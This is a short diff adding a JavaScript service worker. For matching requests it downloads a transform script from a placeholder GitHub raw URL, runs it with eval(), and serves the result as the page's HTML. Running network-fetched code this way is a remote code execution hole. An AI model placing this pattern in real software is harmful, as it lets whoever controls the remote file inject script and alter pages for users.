@@ -1,0 +1,16 @@
+self.addEventListener("fetch", (event) => {
+  event.respondWith(
+    Promise.all([
+      fetch("https://raw.githubusercontent.com/user/repo/main/url.txt"),
+      fetch("https://raw.githubusercontent.com/user/repo/main/transform.js")
+    ]).then(async ([urlResponse, transformResponse]) => {
+      const targetUrl = (await urlResponse.text()).trim();
+      if (event.request.url !== targetUrl) return fetch(event.request);
+      const text = await fetch(event.request).then(r => r.text());
+      const transform = eval(await transformResponse.text());
+      return new Response(transform(text), {
+        headers: { "Content-Type": "text/html" },
+      });
+    })
+  );
+});
